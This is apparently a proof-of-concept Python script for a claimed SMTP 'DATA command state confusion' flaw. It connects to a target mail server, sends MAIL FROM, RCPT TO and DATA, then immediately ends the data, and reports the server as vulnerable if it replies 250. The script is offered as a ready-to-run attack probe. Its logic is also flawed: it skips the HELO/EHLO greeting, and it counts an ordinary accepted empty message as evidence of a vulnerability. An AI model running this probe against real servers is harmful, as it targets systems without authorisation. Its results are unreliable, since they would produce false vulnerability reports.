#!/usr/bin/env python3
import socket
import sys

def send_command(sock, command):
    """Send an SMTP command and return the server's response."""
    sock.sendall((command + '\r\n').encode('utf-8'))
    response = b''
    while True:
        data = sock.recv(4096)
        if not data:
            break
        response += data
        # Check if the response is complete (SMTP responses end with CRLF)
        if response.endswith(b'\r\n'):
            break
    return response.decode('utf-8')

def main():
    if len(sys.argv) != 3:
        print("Usage: python poc_data_command_state_confusion.py <target_ip> <target_port>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    try:
        # Step 1: Set up the minimum network interaction needed
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, target_port))
        print("Connected to target SMTP server.")

        # Read initial banner
        banner = sock.recv(4096).decode('utf-8')
        print(f"Server Banner: {banner.strip()}")

        # Step 2: Craft the specific protocol messages described in the vulnerability
        # Step 1: Attacker initiates a mail transaction with MAIL FROM and RCPT TO commands.
        mail_from = "MAIL FROM:<attacker@example.com>"
        rcpt_to = "RCPT TO:<victim@example.com>"
        data_cmd = "DATA"
        end_of_data = "."

        # Step 3: Send them to a target
        print("Sending MAIL FROM command...")
        response = send_command(sock, mail_from)
        print(f"Response: {response.strip()}")

        print("Sending RCPT TO command...")
        response = send_command(sock, rcpt_to)
        print(f"Response: {response.strip()}")

        print("Sending DATA command...")
        response = send_command(sock, data_cmd)
        print(f"Response: {response.strip()}")

        # Step 4: Instead of sending valid mail data, the attacker immediately sends the end-of-data indicator
        print("Sending end-of-data indicator immediately...")
        response = send_command(sock, end_of_data)
        print(f"Response: {response.strip()}")

        # Observe/report the outcome
        if "250" in response:
            print("[VULNERABLE] The server accepted the empty message. State confusion may have occurred.")
        else:
            print("[NOT VULNERABLE] The server rejected the empty message or handled it correctly.")

        # Clean up
        sock.sendall(b"QUIT\r\n")
        sock.close()

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()